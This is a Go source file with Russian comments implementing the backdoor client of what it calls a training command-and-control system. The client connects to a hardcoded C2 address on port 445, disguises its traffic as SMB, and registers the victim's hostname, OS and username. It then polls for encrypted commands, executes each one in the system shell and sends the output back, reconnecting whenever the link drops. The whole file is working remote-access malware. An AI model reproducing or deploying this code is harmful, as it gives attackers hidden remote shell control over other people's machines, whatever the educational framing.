// Package main реализует клиент-бэкдор учебной C2-системы.
// Клиент подключается к C2-серверу по TCP (порт 445, псевдо-SMB),
// регистрируется, циклически запрашивает задачи, выполняет команды
// в командной оболочке и отправляет результаты обратно на C2.
package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"c2project/shared"
)

// Адрес C2-сервера и порт для обмена задачами.
const (
	c2Address = "192.168.56.104:445"
)

// generateClientID формирует строку с информацией о клиенте
// (hostname, OS, username), разделённую символом '|'.
// Может использоваться для отладки.
func generateClientID() string {
	hostname, _ := os.Hostname()
	osName := runtime.GOOS
	user := os.Getenv("USERNAME")
	if user == "" {
		user = os.Getenv("USER")
	}
	raw := fmt.Sprintf("%s|%s|%s", hostname, osName, user)
	return raw
}

// buildRegistration формирует строку регистрации для отправки на C2
// в формате "id|hostname|os", где id = "hostname-OS-username".
// Возвращает готовую к шифрованию и отправке строку.
func buildRegistration() string {
	hostname, _ := os.Hostname()
	osName := runtime.GOOS
	user := os.Getenv("USERNAME")
	if user == "" {
		user = os.Getenv("USER")
	}
	id := fmt.Sprintf("%s-%s-%s", hostname, osName, user)
	return fmt.Sprintf("%s|%s|%s", id, hostname, osName)
}

// sendPacket сериализует и отправляет пакет псевдо-SMB на C2.
// Параметры:
//   - conn — активное TCP-соединение;
//   - cmd — код команды (CmdRegister, CmdGetTask, CmdSendResult и т.д.);
//   - payload — зашифрованная полезная нагрузка.
// Возвращает ошибку при сбое записи в соединение.
func sendPacket(conn net.Conn, cmd uint16, payload []byte) error {
	pkt := &shared.Packet{
		Command:   cmd,
		SessionID: 0,
		MessageID: uint64(time.Now().UnixNano()),
		Payload:   payload,
	}
	_, err := conn.Write(pkt.Serialize())
	return err
}

// cp866Table — таблица соответствия байтов CP866 (DOS) и Unicode-символов.
// Используется для корректной конвертации русских букв из вывода cmd.exe.
var cp866Table = map[byte]rune{
	0x80: 'А', 0x81: 'Б', 0x82: 'В', 0x83: 'Г', 0x84: 'Д', 0x85: 'Е', 0x86: 'Ж', 0x87: 'З',
	0x88: 'И', 0x89: 'Й', 0x8A: 'К', 0x8B: 'Л', 0x8C: 'М', 0x8D: 'Н', 0x8E: 'О', 0x8F: 'П',
	0x90: 'Р', 0x91: 'С', 0x92: 'Т', 0x93: 'У', 0x94: 'Ф', 0x95: 'Х', 0x96: 'Ц', 0x97: 'Ч',
	0x98: 'Ш', 0x99: 'Щ', 0x9A: 'Ъ', 0x9B: 'Ы', 0x9C: 'Ь', 0x9D: 'Э', 0x9E: 'Ю', 0x9F: 'Я',
	0xA0: 'а', 0xA1: 'б', 0xA2: 'в', 0xA3: 'г', 0xA4: 'д', 0xA5: 'е', 0xA6: 'ж', 0xA7: 'з',
	0xA8: 'и', 0xA9: 'й', 0xAA: 'к', 0xAB: 'л', 0xAC: 'м', 0xAD: 'н', 0xAE: 'о', 0xAF: 'п',
	0xB0: '░', 0xB1: '▒', 0xB2: '▓', 0xB3: '│', 0xB4: '┤', 0xB5: '╡', 0xB6: '╢', 0xB7: '╖',
	0xB8: '╕', 0xB9: '╣', 0xBA: '║', 0xBB: '╗', 0xBC: '╝', 0xBD: '╜', 0xBE: '╛', 0xBF: '┐',
	0xC0: '└', 0xC1: '┴', 0xC2: '┬', 0xC3: '├', 0xC4: '─', 0xC5: '┼', 0xC6: '╞', 0xC7: '╟',
	0xC8: '╚', 0xC9: '╔', 0xCA: '╩', 0xCB: '╦', 0xCC: '╠', 0xCD: '═', 0xCE: '╬', 0xCF: '╧',
	0xD0: '╨', 0xD1: '╤', 0xD2: '╥', 0xD3: '╙', 0xD4: '╘', 0xD5: '╒', 0xD6: '╓', 0xD7: '╫',
	0xD8: '╪', 0xD9: '┘', 0xDA: '┌', 0xDB: '█', 0xDC: '▄', 0xDD: '▌', 0xDE: '▐', 0xDF: '▀',
	0xE0: 'р', 0xE1: 'с', 0xE2: 'т', 0xE3: 'у', 0xE4: 'ф', 0xE5: 'х', 0xE6: 'ц', 0xE7: 'ч',
	0xE8: 'ш', 0xE9: 'щ', 0xEA: 'ъ', 0xEB: 'ы', 0xEC: 'ь', 0xED: 'э', 0xEE: 'ю', 0xEF: 'я',
	0xF0: 'Ё', 0xF1: 'ё', 0xF2: 'Є', 0xF3: 'є', 0xF4: 'Ї', 0xF5: 'ї', 0xF6: 'Ў', 0xF7: 'ў',
	0xF8: '°', 0xF9: '∙', 0xFA: '·', 0xFB: '√', 0xFC: '№', 0xFD: '¤', 0xFE: '■', 0xFF: '\u00A0',
}

// cp866ToUTF8 конвертирует строку из кодировки CP866 в UTF-8.
// Байты < 0x80 остаются без изменений (ASCII), байты >= 0x80
// заменяются на соответствующие Unicode-символы из cp866Table.
func cp866ToUTF8(s string) string {
	var b strings.Builder
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c < 0x80 {
			b.WriteByte(c)
		} else if r, ok := cp866Table[c]; ok {
			b.WriteRune(r)
		} else {
			b.WriteByte(c)
		}
	}
	return b.String()
}

// executeCommand выполняет переданную команду в командной оболочке
// целевой ОС и возвращает объединённый вывод STDOUT и STDERR.
// На Windows вывод предварительно переводится в кодировку CP866,
// затем конвертируется в UTF-8 для корректной передачи через C2.
// В случае ошибки выполнения к результату добавляется текст ошибки.
func executeCommand(cmd string) string {
	var out []byte
	var err error
	if runtime.GOOS == "windows" {
		fullCmd := "chcp 866>nul && " + cmd
		out, err = exec.Command("cmd", "/C", fullCmd).CombinedOutput()
	} else {
		out, err = exec.Command("sh", "-c", cmd).CombinedOutput()
	}
	result := cp866ToUTF8(string(out))
	if err != nil {
		result += "\n[error] " + err.Error()
	}
	return result
}

// run устанавливает соединение с C2-сервером, регистрируется,
// затем в цикле запрашивает задачи, выполняет их и отправляет результаты.
// При любой ошибке соединения функция завершается, а main выполняет
// повторное подключение через заданный интервал.
func run() {
	log.Printf("[CLIENT] Подключение к C2 %s", c2Address)
	conn, err := net.Dial("tcp", c2Address)
	if err != nil {
		log.Printf("[CLIENT] Ошибка подключения: %v", err)
		return
	}
	defer conn.Close()

	regData := buildRegistration()
	encReg, err := shared.Encrypt(shared.KeyC2ToClient, []byte(regData))
	if err != nil {
		log.Printf("[CLIENT] Ошибка шифрования регистрации: %v", err)
		return
	}

	if err := sendPacket(conn, shared.CmdRegister, encReg); err != nil {
		log.Printf("[CLIENT] Ошибка отправки регистрации: %v", err)
		return
	}

	ack, err := shared.ReadPacket(conn)
	if err != nil || ack.Command != shared.CmdRegisterAck {
		log.Printf("[CLIENT] Регистрация не подтверждена")
		return
	}
	log.Printf("[CLIENT] Зарегистрирован на C2")

	for {
		time.Sleep(3 * time.Second)

		if err := sendPacket(conn, shared.CmdGetTask, nil); err != nil {
			log.Printf("[CLIENT] Ошибка запроса задачи: %v", err)
			return
		}

		resp, err := shared.ReadPacket(conn)
		if err != nil {
			log.Printf("[CLIENT] Ошибка чтения задачи: %v", err)
			return
		}

		if resp.Command != shared.CmdTaskData {
			continue
		}

		if len(resp.Payload) == 0 {
			continue
		}

		plainCmd, err := shared.Decrypt(shared.KeyC2ToClient, resp.Payload)
		if err != nil {
			log.Printf("[CLIENT] Ошибка расшифровки команды: %v", err)
			continue
		}
		cmdStr := strings.TrimSpace(string(plainCmd))
		log.Printf("[CLIENT] Получена команда: %s", cmdStr)

		output := executeCommand(cmdStr)
		log.Printf("[CLIENT] Результат: %s", output)

		encResult, err := shared.Encrypt(shared.KeyC2ToClient, []byte(output))
		if err != nil {
			log.Printf("[CLIENT] Ошибка шифрования результата: %v", err)
			continue
		}

		if err := sendPacket(conn, shared.CmdSendResult, encResult); err != nil {
			log.Printf("[CLIENT] Ошибка отправки результата: %v", err)
			return
		}

		_, _ = shared.ReadPacket(conn)
	}
}

// main запускает бесконечный цикл: подключение к C2, работа,
// затем ожидание 10 секунд и повторное подключение при разрыве.
func main() {
	for {
		run()
		log.Printf("[CLIENT] Переподключение через 10 секунд")
		time.Sleep(10 * time.Second)
	}
}
